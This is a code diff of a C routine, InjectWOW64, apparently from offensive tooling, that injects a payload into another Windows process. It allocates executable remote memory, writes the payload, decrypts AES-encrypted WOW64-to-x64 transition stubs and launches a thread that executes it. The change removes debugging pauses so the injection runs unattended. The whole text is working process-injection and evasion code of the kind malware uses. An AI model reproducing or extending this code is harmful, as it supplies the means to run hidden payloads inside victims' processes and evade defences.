@@ -271,14 +271,14 @@ int InjectWOW64(HANDLE hProc, unsigned char* payload, unsigned int payload_len) 
 	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
 	WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);
 
-	printf("remcode = %p\n", pRemoteCode); getchar();
+	printf("remcode = %p\n", pRemoteCode);
 
 	// alloc a RW buffer in this process for the EXECUTEX64 function
 	pExecuteX64 = (EXECUTEX64)VirtualAlloc(NULL, sizeof(sh_executex64), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 	// alloc a RW buffer in this process for the X64FUNCTION function (and its context)
 	pX64function = (X64FUNCTION)VirtualAlloc(NULL, sizeof(sh_wownativex) + sizeof(WOW64CONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 
-	printf("pExecuteX64 = %p ; pX64function = %p\n", pExecuteX64, pX64function); getchar();
+	printf("pExecuteX64 = %p ; pX64function = %p\n", pExecuteX64, pX64function);
 
 	// decrypt and copy over the wow64->x64 stub
 	AESDecrypt((char*)sh_executex64, sh_executex64_len, (char*)sh_executex64_key, sh_executex64_key_len);
@@ -300,14 +300,13 @@ int InjectWOW64(HANDLE hProc, unsigned char* payload, unsigned int payload_len) 
 	ctx->p.lpParameter = 0;
 	ctx->t.hThread = NULL;
 
-	printf("hit me...\n"); getchar();
 
 	// run a new thread in target process
 	pExecuteX64(pX64function, (DWORD)ctx);
 
 	if (ctx->t.hThread) {
 		// if success, resume the thread -> execute payload
-		printf("Thread should be there, frozen...\n"); getchar();
+		printf("Thread should be there, frozen...\n");
 		ResumeThread(ctx->t.hThread);
 
 		// cleanup in target process
